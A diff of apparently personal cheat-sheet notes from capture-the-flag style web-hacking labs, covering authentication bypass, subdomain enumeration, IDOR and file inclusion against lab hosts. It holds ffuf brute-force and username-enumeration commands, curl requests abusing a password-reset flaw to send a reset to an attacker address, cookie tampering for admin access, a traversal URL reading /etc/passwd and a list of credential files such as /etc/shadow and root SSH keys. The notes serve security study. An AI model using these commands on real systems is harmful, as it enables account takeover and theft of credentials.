@@ -1,4 +1,23 @@
+Authentication Bypass
+https://github.com/ffuf/ffuf
 
+Username Enumeration 
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
+
+Brute Force 
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+
+Logic Flaw 
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+
+Cookie Tampering 
+curl http://MACHINE_IP/cookie-test
+curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
+curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-tes
+
+----------------------------------------------------------------
+Subdomain Enumeration
 ----------------------------------------------------------------
 {Brute Force, OSINT (Open-Source Intelligence) and Virtual Host}
 ----------------------------------------------------------------
@@ -20,7 +39,7 @@ Virtual Host
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
 ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}
 
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 IDOR - Insecure Direct Object Reference
 ---------------------------------------
@@ -29,4 +48,43 @@ eg  browser developer tools, select the network tab and then refresh the page fi
 https://www.base64decode.org/ 
 https://crackstation.net/ 
 
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+File inclusion
+Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal
+
+Directory traversal
+http://webapp.thm/get.php?file=../../../../etc/passwd
+
+
+/etc/issue  contains a message or system identification to be printed before the login prompt.
+
+/etc/profile  controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
+
+/proc/version  	                specifies the version of the Linux kernel
+
+/etc/passwd                    	has all registered user that has access to a system
+
+/etc/shadow                    	contains information about the system's users' passwords
+
+/root/.bash_history             contains the history commands for root user
+
+/var/log/dmessage    	          contains global system messages, including the messages that are logged during system startup
+
+/var/mail/root                  all emails for root user
+
+/root/.ssh/id_rsa              	Private SSH keys for a root or any known valid user on the server
+
+/var/log/apache2/access.log     the accessed requests for Apache  webserver
+
+C:\boot.ini                      contains the boot options for computers with BIOS firmware
+
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+
+
+
+
+
+
